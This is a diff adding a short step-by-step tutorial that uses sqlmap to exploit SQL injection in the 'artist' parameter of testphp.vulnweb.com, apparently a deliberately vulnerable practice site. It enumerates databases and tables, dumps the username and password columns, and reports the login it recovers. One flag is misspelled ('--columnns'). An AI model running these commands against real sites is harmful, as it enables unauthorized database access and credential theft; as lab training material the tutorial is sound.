@@ -1,0 +1,33 @@
+Identify the vulnerable input field: In this case, the vulnerable input field is the "artist" parameter in the URL.
+
+Use SQLMap to scan the target website: Run SQLMap against the target website by using the following command:
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
+This command instructs SQLMap to scan the target URL for available databases (--dbs). SQLMap will then return a list of databases available on the server.
+
+Identify the target database: Look for the database that contains the information you want to retrieve. In this case, you want to retrieve information from the "users" table in the "acuart" database.
+
+Use SQLMap to dump the tables in the target database: Run SQLMap against the target database by using the following command:
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
+
+This command instructs SQLMap to dump the tables (--tables) in the "acuart" database (-D acuart).
+
+Identify the target table: Look for the "users" table in the list of dumped tables.
+
+Use SQLMap to dump the columns  in the target table: Run SQLMap against the target table by using the following command:
+
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columnns
+
+Now we need to dump username of the login for the website we use this command 
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump 
+
+Now we need to dump pass of the login for the website we use this command :
+
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C pass --dump 
+
+Now we have the user name and password to login we can go to the website and try login 
+
+The user name and password we got is "test" and "test" respectively.
+
